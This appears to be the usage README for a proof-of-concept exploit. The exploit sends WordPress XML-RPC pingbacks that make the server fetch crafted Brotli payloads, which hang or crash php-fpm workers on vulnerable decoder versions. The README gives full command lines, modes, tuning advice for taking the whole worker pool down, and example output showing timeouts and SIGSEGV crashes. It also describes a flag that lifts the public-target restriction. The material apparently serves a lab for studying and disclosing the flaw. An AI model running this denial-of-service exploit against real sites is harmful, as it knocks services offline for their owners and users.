# PoC usage

The PoC is `poc/pingback_poc.py`. It uses only the Python standard library.

```bash
python3 poc/pingback_poc.py --help
```

---

## Safety model

* The target must resolve to a loopback/private/link-local address.
* A target that resolves to a public IP is refused unless
  `--i-own-this-target` is supplied.
* `--count` is capped at 32.
* The tool never implements RCE; it sends a pingback and classifies the
  response.

If you are testing a public host you own, use the flag **and** make sure you
have written authorization. The lab is designed for `http://localhost:8080`.

---

## Modes

### `--mode probe`

Checks:

1. `GET /` returns HTML and a `<title>`;
2. `POST /xmlrpc.php` with `system.listMethods` lists `pingback.ping`.

```bash
python3 poc/pingback_poc.py --target http://localhost:8080 --mode probe
```

Exit code 0 if `pingback.ping` is exposed, 1 otherwise.

### `--mode hang`

Sends the 86-byte payload. Expected outcomes:

* `timeout` — the worker never answered (decoder spin);
* `HTTP 502/504` after several seconds — php-fpm killed the stuck worker.

```bash
python3 poc/pingback_poc.py \
  --target http://localhost:8080 \
  --payload-url http://attacker:8080/small.br \
  --mode hang --workers 4 --count 4 --timeout 25 --show-logs
```

### `--mode crash`

Sends the 23 MB payload. Expected outcomes:

* connection reset / `RemoteDisconnected`;
* `HTTP 502/504` within a few seconds (nginx saw the upstream die);
* `timeout` is reported as **inconclusive**: the 23 MB transfer may be
  slower than the client timeout.

```bash
python3 poc/pingback_poc.py \
  --target http://localhost:8080 \
  --payload-url http://attacker:8080/payload.br \
  --mode crash --workers 1 --count 1 --timeout 30 --show-logs
```

---

## Options

| Option | Default | Meaning |
|---|---|---|
| `--target` | required | WordPress base URL |
| `--post-url` | `TARGET/?p=1` | pingback target post |
| `--payload-url` | required for hang/crash | URL WordPress will fetch |
| `--mode` | `probe` | `probe`, `hang`, `crash` |
| `--workers` | `4` | concurrent pingbacks |
| `--count` | `workers` | total pingbacks (max 32) |
| `--timeout` | `25` | per-request timeout in seconds |
| `--check-payload` | off | `GET /health` on the payload server |
| `--show-logs` | off | read recent `docker compose logs wordpress` |
| `--docker-project` | `brotli-pingback-lab` | Compose project name for logs |
| `--recovery-wait` | `6` | seconds to wait before the final site probe in hang mode |
| `--i-own-this-target` | off | allow a public target |
| `--json` | off | emit a machine-readable summary |

---

## Example output — hang

```text
[*] target      : http://localhost:8080
[*] post        : http://localhost:8080/?p=1
[*] payload     : http://attacker:8080/small.br
[*] mode        : hang
[*] concurrency : 4 (4 total)

[*] site before : HTTP 200 in 0.0s
[1] -> sourceURI=http://attacker:8080/small.br?cb=...
[2] -> sourceURI=http://attacker:8080/small.br?cb=...
[3] -> sourceURI=http://attacker:8080/small.br?cb=...
[4] -> sourceURI=http://attacker:8080/small.br?cb=...
[1] <- timeout after 25.0s
...
[*] summary
    hung                     4
[!] 4 request(s) hung or forced a worker kill
[*] site after  : timeout after 5.0s (attack took 25.0s)
[*] waiting 6s for php-fpm to reap stuck workers ...
[*] site recovered: HTTP 200 in 0.0s

[*] recent php-fpm / WordPress log lines
    WARNING: [pool www] child 43 execution timed out (15.0 sec), terminating
    WARNING: [pool www] child 43 exited on signal 15 (SIGTERM) after 15.1 seconds from start
```

## Example output — crash

```text
[*] target      : http://localhost:8080
[*] mode        : crash
[*] concurrency : 1 (1 total)

[*] site before : HTTP 200 in 0.0s
[1] -> sourceURI=http://attacker:8080/payload.br?cb=...
[1] <- HTTP 502 in 1.8s
[*] summary
    crashed                  1
[!] 1 request(s) look like worker crashes
[*] site after  : HTTP 200 in 0.0s

[*] recent php-fpm / WordPress log lines
    WARNING: [pool www] child 42 exited on signal 11 (SIGSEGV) after 1.2 seconds from start
```

The site stays up after a single crash because php-fpm respawns the worker.
Send `--workers 4 --count 4` to take the whole pool down briefly.

---

## Interpreting failures

| Observation | Likely cause |
|---|---|
| XML-RPC fault “The source URL does not exist” | WordPress could not fetch the payload; check tunnel/host/allowlist/timeout |
| XML-RPC fault “A title on that page cannot be found” | the payload decoded as something that is not HTML; for the hang/crash this should not happen |
| HTTP 200 with a fault, fast | decoder is patched or the payload was not `Content-Encoding: br` |
| `HTTP 502` immediately (no delay) | nginx cannot reach php-fpm; the lab is not healthy |
| `timeout` in crash mode | 23 MB did not finish inside `--timeout`; use the local attacker URL |
| 404 on `--post-url` | the Hello World post was deleted; run `make init` or pass `--post-url` |

---

## Payload generator

The lab server generates both payloads at startup. You can also generate
them locally for inspection:

```bash
python3 lab/attacker/payload.py info
python3 lab/attacker/payload.py hang  /tmp/hang.br
python3 lab/attacker/payload.py crash /tmp/crash.br
xxd /tmp/hang.br | head
```

`/tmp/crash.br` is 23,068,820 bytes. Do not commit it.

Verify a payload with the `brotli` CLI or a patched library: a patched
decoder rejects it with a format error; a vulnerable decoder either spins
(86 B) or crashes (23 MB).

---

## Limitations

* The crash tail is specific to the x86-64 `BrotliDecoderState` layout of
  Brotli 1.1.0/1.2.0. Other versions may need different offsets.
* The 23 MB payload must reach the target within WordPress's 10-second HTTP
  timeout and must preserve the chunk boundary. This is reliable on the
  local Docker network; a slow tunnel may not work.
* A Cloudflare Quick Tunnel decodes `Content-Encoding: br` at the edge, so
  the target receives the decoded body. Do not use a Quick Tunnel URL for
  `--payload-url` if you expect a crash; see [`cloudflare.md`](cloudflare.md).
* The PoC classifies 502/connection reset as “crashed”. Confirm with the
  php-fpm log (`signal 11`) before drawing conclusions.
* No RCE is attempted or provided.
